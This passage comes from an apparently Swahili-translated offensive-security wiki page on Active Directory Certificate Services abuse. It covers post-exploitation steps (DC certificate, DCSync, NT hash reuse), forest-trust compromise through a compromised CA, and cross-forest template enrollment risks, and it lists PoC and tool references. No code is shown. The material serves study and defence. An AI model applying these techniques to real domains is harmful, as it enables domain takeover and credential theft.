- Exploitation iliyofanikiwa huandika **DC `.pfx`** na **Kerberos `.ccache`** locally.
- Kwa sababu certificate ina-map kwa **Domain Controller account**, hatua zinazofuata zinaweza kujumuisha **certificate-based Kerberos auth**, **DCSync**, na matumizi tena ya **machine NT hash** iliyopatikana.<sup>[[2]](#references)</sup>

## Compromising Forests with Certificates Imeelezwa kwa Passive Voice

### Kuvunjwa kwa Forest Trusts na CAs Zilizokompromitiwa

Configuration ya **cross-forest enrollment** inafanywa kuwa rahisi kwa kiwango fulani. **Root CA certificate** kutoka resource forest **huchapishwa kwenye account forests** na administrators, na **enterprise CA** certificates kutoka resource forest **huongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest**. Kwa ufafanuzi, mpangilio huu huipa **CA katika resource forest udhibiti kamili** juu ya forests nyingine zote ambazo inasimamia PKI. Ikiwa CA hii **itakompromitiwa na attackers**, certificates za users wote katika resource na account forests zote zinaweza **kuforgiwa nao**, hivyo kuvunja security boundary ya forest.<sup>[[6]](#references)</sup>

### Enrollment Privileges Zinazopewa Foreign Principals

Katika multi-forest environments, tahadhari inahitajika kuhusu Enterprise CAs ambazo **huchapisha certificate templates** zinazoruhusu **Authenticated Users au foreign principals** (users/groups walio nje ya forest ambayo Enterprise CA ni mali yake) kupata **enrollment na edit rights**.\
Wakati wa authentication kupitia trust, **Authenticated Users SID** huongezwa kwenye token ya user na AD. Kwa hiyo, ikiwa domain ina Enterprise CA yenye template ambayo **inaruhusu Authenticated Users enrollment rights**, template inaweza **ku-enroll-iwa na user kutoka forest tofauti**. Vilevile, ikiwa **enrollment rights zimepewa foreign principal waziwazi na template**, **cross-forest access-control relationship huundwa** kwa njia hiyo, na kumwezesha principal kutoka forest moja **ku-enroll kwenye template kutoka forest nyingine**.

Scenarios zote mbili husababisha **ongezeko la attack surface** kutoka forest moja hadi nyingine. Settings za certificate template zinaweza kutumiwa na attacker kupata privileges za ziada katika foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Uchambuzi wa kiufundi wa Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blogu ya SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Iliyothibitishwa na Mwenyewe: Kutumia Vibaya Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Mbinu Mpya za Authentication na Request na zaidi](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Kutumia Vibaya Key Trust Account Mapping kwa Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Hadithi ya Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Ku-relay kwenda AD Certificate Services kupitia RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access kwa ADCS CA yenye YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Mbinu ya Kutumia Vibaya ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Mbinu ya Kutumia Vibaya ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Si AD CS ESC Nyingine Tu](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration na Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
